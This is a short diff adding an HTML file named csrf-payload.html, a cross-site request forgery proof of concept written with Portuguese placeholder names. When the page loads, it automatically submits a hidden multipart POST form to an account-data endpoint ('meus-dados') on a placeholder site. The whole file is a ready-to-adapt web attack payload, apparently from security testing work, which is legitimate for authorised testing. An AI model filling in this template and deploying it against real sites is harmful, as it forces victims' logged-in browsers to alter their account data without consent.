@@ -1,0 +1,8 @@
+<!-- csrf-payload.html -->
+<html>
+  <body onload="document.forms[0].submit()">
+    <form action="https://www.site.com/api/site/meus-dados" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="NOME_DO_PARAMETRO" value="valor_do_parametro">
+    </form>
+  </body>
+</html>
